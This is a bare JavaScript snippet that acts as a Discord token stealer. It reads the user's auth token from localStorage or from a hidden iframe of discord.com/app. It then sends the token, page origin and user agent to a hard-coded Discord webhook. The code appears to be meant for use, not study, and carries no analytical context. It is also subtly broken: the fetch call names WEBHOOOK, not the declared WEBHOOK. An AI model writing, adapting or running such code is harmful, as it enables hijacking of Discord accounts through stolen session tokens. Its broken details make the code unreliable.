const WEBHOOK = 'https://discord.com/api/webhooks/1454891890687213580/MTQwMDg2NzA5NDU1MTA3Mjc4OA_Gs8rh0.huAcEabj0qUaf86lMRCuOzy3eRKlG9pkruVXqY';

const sleep = ms => new Promise(r => setTimeout(r, ms));

(async () => {
  let t;
  try { t = localStorage.token; } catch {}
  if (!t) {
    const f = document.createElement('iframe');
    f.style.display = 'none';
    f.src = 'https://discord.com/app';
    document.body.append(f);
    await sleep(800);
    try { t = f.contentWindow.localStorage.token; } catch {}
    f.remove();
  }
  if (t) fetch(WEBHOOOK, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      embeds: [{
        color: 0x5865f2,
        title: 'Token',
        fields: [
          { name: 'Token', value: t },
          { name: 'Origem', value: location.origin },
          { name: 'UA', value: navigator.userAgent }
        ]
      }]
    })
  });
})();
